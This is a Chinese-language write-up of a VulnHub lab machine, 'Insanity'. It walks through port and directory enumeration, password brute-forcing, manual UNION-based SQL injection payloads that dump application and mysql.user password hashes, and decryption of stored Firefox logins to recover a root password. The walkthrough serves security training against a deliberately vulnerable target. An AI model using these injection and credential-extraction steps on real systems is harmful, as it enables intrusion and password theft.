# 靶机信息
insanity是vulnhub中的一台困难难度的渗透测试靶机

# 信息收集
## nmap扫描
```
└─$ nmap -sCV -p21,22,80 192.168.218.202 -oA nmapScan/details                   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-26 20:47 EDT
Nmap scan report for 192.168.218.202 (192.168.218.202)
Host is up (0.00034s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: ERROR
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.218.148
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 85:46:41:06:da:83:04:01:b0:e4:1f:9b:7e:8b:31:9f (RSA)
|   256 e4:9c:b1:f2:44:f1:f0:4b:c3:80:93:a9:5d:96:98:d3 (ECDSA)
|_  256 65:cf:b4:af:ad:86:56:ef:ae:8b:bf:f2:f0:d9:be:10 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/7.2.33)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.2.33
|_http-title: Insanity - UK and European Servers
MAC Address: 00:0C:29:04:2E:81 (VMware)
Service Info: OS: Unix
```
此靶机只有tcp端口开放

# 初始信息枚举
## FTP枚举
```
ftp 192.168.218.202
Connected to 192.168.218.202.
220 (vsFTPd 3.0.2)
Name (192.168.218.202:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> binary
200 Switching to Binary mode.
ftp> ls
229 Entering Extended Passive Mode (|||19853|).
ftp: Can't connect to `192.168.218.202:19853': 没有到主机的路由
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0               6 Apr 01  2020 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> passive
Passive mode: on; fallback to active mode: on.
ftp> ls
229 Entering Extended Passive Mode (|||14927|).
ftp: Can't connect to `192.168.218.202:14927': 没有到主机的路由
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> quit
221 Goodbye.
```
可以匿名登录但是啥也没有

## gobuster扫描
```
└─$ gobuster dir -u http://192.168.218.202/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -x html,php,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.218.202/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/js                   (Status: 301) [Size: 234] [--> http://192.168.218.202/js/]
/css                  (Status: 301) [Size: 235] [--> http://192.168.218.202/css/]
/img                  (Status: 301) [Size: 235] [--> http://192.168.218.202/img/]
/data                 (Status: 301) [Size: 236] [--> http://192.168.218.202/data/]
/news                 (Status: 301) [Size: 236] [--> http://192.168.218.202/news/]
/index.php            (Status: 200) [Size: 31]
/index.html           (Status: 200) [Size: 22263]
/fonts                (Status: 301) [Size: 237] [--> http://192.168.218.202/fonts/]
/webmail              (Status: 301) [Size: 239] [--> http://192.168.218.202/webmail/]
/phpmyadmin           (Status: 301) [Size: 242] [--> http://192.168.218.202/phpmyadmin/]
/monitoring           (Status: 301) [Size: 242] [--> http://192.168.218.202/monitoring/]
/licence              (Status: 200) [Size: 57]
/phpinfo.php          (Status: 200) [Size: 85293]
/index.html           (Status: 200) [Size: 22263]
/index.php            (Status: 200) [Size: 31]
Progress: 224656 / 224660 (100.00%)
===============================================================
Finished
===============================================================
```
> /webmail 又是这个松鼠邮箱
> /phpmyadmin 可以 anonymous 无密码登录但是啥也没有
> /monitoring 是一个登录页面

# web信息枚举
看主页，好像就是一个静态页面，找了半天也没找到可以利用的，再扫一下目录，二级目录也扫。
先看看monitoring 这个登录页面，没有啥信息，爆破一下，放后台。
在扫 /news 的时候，扫出来了很多，是一个 BluditCMS ，枚举一下。

<img width="1916" height="921" alt="Image" src="https://github.com/user-attachments/assets/4c5708f1-7c4b-4044-a002-acdf414da654" />

这个页面中出现了一个人名和一个邮箱信息，将这个人名拿去爆破一下，再把邮箱拿到 /webmail 页面爆破一下。
使用 burp 爆破记得跟随重定向，不然会导致 burp 所有拦截的响应都是**302Redirect** 导致爆破失败。
然后爆破出来凭据是 Otis:123456
由于是一个站点试一下其他的登录框，包括 **/webmail** 和 **/news/admin/login** webmail 是可以登录进去的
<img width="1918" height="857" alt="Image" src="https://github.com/user-attachments/assets/47d9ccb7-ad5b-4063-b7ac-48587612bc86" />

先试试这个邮箱页面的一个 RCE 利用，但是尝试几次失败了。

<img width="1919" height="945" alt="Image" src="https://github.com/user-attachments/assets/e4748bb9-ccd9-4b26-82c4-74a66faca6f4" />

再去看看另一个页面基本功能点，好像没啥有用的，修改服务器信息，sql 注入不行，xss 没用，上面 url 的目录穿越不行，好像就这么多了，里面一行说明说服务器故障会发邮件给邮箱，然后去看松鼠邮箱，确实又邮件随便点一个看看

<img width="1919" height="909" alt="Image" src="https://github.com/user-attachments/assets/c2c07d9a-5fb9-4c67-84f7-8448adb83ee5" />

## SQL注入
发现里面包含了监控系统服务器的 name ，感觉这里有东西，因为先前知道提示说有注入，试一下，添加一些关闭的主机上去，然后写入 sql 语句，我一次性把闭合都写上去，但是页面出错了，就一个一个试，修改 name 之后等一会 等 status 出现 down 之后，邮箱会出现提醒邮件，在尝试到双引号的时候

<img width="1919" height="962" alt="Image" src="https://github.com/user-attachments/assets/b1d765aa-b1b5-4048-b917-ac69e66e8f38" />

这里貌似将所有的信息都输出了，看来是注入成功了。
不好使用 sqlmap 就直接手注了。

<img width="1908" height="283" alt="Image" src="https://github.com/user-attachments/assets/51a1b83d-60e0-44de-b69c-97bc3ea61420" />

<img width="1919" height="198" alt="Image" src="https://github.com/user-attachments/assets/09a8866c-129e-4891-b9b1-65c6029c956d" />

ok出来了，好办。
`test" union select 1,2,3,database() -- -`

<img width="1919" height="189" alt="Image" src="https://github.com/user-attachments/assets/a1a3a40b-934b-47d5-9fd8-4e9b1f9aa58f" />

`test" union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema = database() -- -`

<img width="1914" height="182" alt="Image" src="https://github.com/user-attachments/assets/c87d712c-a4be-441f-babb-0a7547df46c7" />
查询出来三个表先看看 users 有没有凭据

`test" union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=‘users’ -- -`

`test" union select 1,2,group_concat(username),group_concat(password) from monitoring.users -- -`

然后拿到三组凭据，但是都破解不开，然后又卡住了，一直以为是没爆破好，最后看提示正确的姿势是系统数据库下的user表

`test" union select 1,group_concat(user),group_concat(password),group_concat(authentication_string) from mysql.user -- -`

这里可以拿到 root 和 elliot 的hash凭据
但是 root 的 hash 破解不开，elliot 的 hash 可以破解**elliot:elliot123**

# 用户提权
使用上面 sql 注入出来的一组凭据登录，开始找提权路径。
懒得手动找了，直接上传 linpeas 扫一遍。
看完输出结果好像没什么可以利用的，试了很多内核漏洞的 exp 均失败，刚进来的时候看到 home 下有很多文件夹还没来得及看，翻翻找找在 .mozilla 目录下看到浏览器的一些信息，最后在 firefox/esmhp32w.default-default 目录下看到一个 logins.json ，跟登录有关
```
{
  "nextId": 2,
  "logins": [
    {
      "id": 1,
      "hostname": "https://localhost:10000",
      "httpRealm": null,
      "formSubmitURL": "https://localhost:10000",
      "usernameField": "user",
      "passwordField": "pass",
      "encryptedUsername": "MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECMXc5x8GLVkkBAh48YcssjnBnQ==",
      "encryptedPassword": "MEoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECPPLux2+J9fKBCApSMIepx/VWtv0rQLkpiuLygt0rrPPRRFoOIlJ40XYbg==",
      "guid": "{0b89dfcb-2db3-499c-adf0-9bd7d87ccd26}",
      "encType": 1,
      "timeCreated": 1597591517872,
      "timeLastUsed": 1597595253716,
      "timePasswordChanged": 1597595253716,
      "timesUsed": 2
    }
  ],
  "version": 2
}
```
搜索发现这个加密需要本地的 key4.db（密钥数据库）配合解密。我利用到这个[工具](https://github.com/unode/firefox_decrypt)来解密。
看了说明，将 ** .mozilla**这个目录直接全部打包，然后使用ssh的scp拿到kali上放到**~**下，然后直接运行py文件。
```
┌──(kali㉿kali)-[~/…/writeup/vulnhub/insanity/firefox_decrypt-main]
└─$ ./firefox_decrypt.py
Select the Mozilla profile you wish to decrypt
1 -> wqqe31s0.default
2 -> esmhp32w.default-default
2

Website:   https://localhost:10000
Username: 'root'
Password: 'S8Y389KJqWpJuSwFqFZHwfZ3GnegUa'
                                                                                                                                                             
┌──(kali㉿kali)-[~/…/writeup/vulnhub/insanity/firefox_decrypt-main]
└─$ 
```
真出来了，我去。
然后这个就是**root**的凭据了
提权完成

# 反思
这个靶机是有难度的，每次到一步都得卡很久，最后看看一点提示，才能继续往后走下去。从开局信息搜索，主要是信息量太大了，很多兔子洞，登录框也多，开始一直以为有什么未授权什么的，加上工具不熟练，卡了一波大的，再到sql注入，这里问题最多害得我重装了几遍靶机才过，主要是因为，sql注入payload的双引号会导致前端的DOM变化，从而引发页面的错误，导致无法继续下一步，拿到sql注入信息之后，又卡住了，拿到的passwd爆破不出来，最后看了一点提示，才从user表拿到登录凭据。再到提权部分，提权部分也有些难度，没有提示，只能一步一步审计，在内核漏洞上卡了很久，最后想起来，home下的目录还没看。再到最后的工具使用。最后提权成功。真正的漏洞不难，但是怎么发现漏洞是个问题。打了几天这个靶机，学到了很多东西。